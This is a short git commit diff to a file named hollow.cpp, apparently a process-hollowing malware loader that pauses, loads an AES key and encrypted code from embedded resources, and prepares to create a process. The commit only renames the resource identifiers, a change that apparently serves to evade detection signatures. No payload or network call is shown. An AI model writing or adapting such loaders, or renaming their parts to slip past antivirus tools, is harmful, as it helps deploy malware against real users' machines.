f3cc0d8195f55163803fda48733457cdbc76d490
dhanush <114467712+dagowda@users.noreply.github.com>
2024-12-29 19:06:14 -0500

    Update hollow.cpp

--- hollow.cpp
+++ hollow.cpp
@@ -24,10 +24,10 @@ int main() {
     Sleep(4000);
     char* key101k;
     DWORD key101kLen;
-    loadResource_with("AESKEY", &key101k, &key101kLen);
+    loadResource_with("dhanushkey1", &key101k, &key101kLen);
     char* code199k;
     DWORD code199kLen;
-    loadResource_with("AESCODE", &code199k, &code199kLen);
+    loadResource_with("dhanushcode56", &code199k, &code199kLen);
     STARTUPINFO si = {0};
     PROCESS_INFORMATION pi = {0};
     si.cb = sizeof(si);
